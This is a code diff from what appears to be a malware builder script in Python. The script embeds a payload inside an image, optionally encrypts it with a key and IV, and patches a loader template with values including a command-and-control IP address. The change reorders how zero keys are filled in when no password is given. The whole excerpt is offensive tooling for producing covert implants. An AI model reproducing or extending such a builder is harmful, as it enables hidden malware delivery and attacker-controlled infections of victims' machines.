@@ -30,12 +30,19 @@ def main():
     output_path = config.get("image_payload", "")
     loader_path = config.get("loader", "")
     patched_path = config.get("loader_build", "")
+    
     # Patch loader
     with open(loader_path, "r") as f:
         loader_code = f.read()
+
+    loader_code = loader_code.replace("{__KEY__}", '{' + ', '.join(['0'] * 32) + '}')
+    loader_code = loader_code.replace("{__IV__}",  '{' + ', '.join(['0'] * 16) + '}')
+
     if image_path and binary_path:
         print(f"[*] Payload {binary_path} will be in the image {image_path}")
-        if password:
+        if not password:
+            print(f"[*] Non encrypted payload!")
+        else:
             # Read files
             with open(image_path, "rb") as f:
                 image_data = f.read()
@@ -64,11 +71,6 @@ def main():
     
             loader_code = loader_code.replace("__KEY__", ', '.join(str(b) for b in key))
             loader_code = loader_code.replace("__IV__", ', '.join(str(b) for b in iv))
-    
-        else:
-            loader_code = loader_code.replace("{__KEY__}", '{' + ', '.join(['0'] * 32) + '}')
-            loader_code = loader_code.replace("{__IV__}",  '{' + ', '.join(['0'] * 16) + '}')
-            print(f"[*] Non encrypted payload!")
 
     replacements = {
         "{__C2_IP__}": f'"{config["C2_IP"]}"',
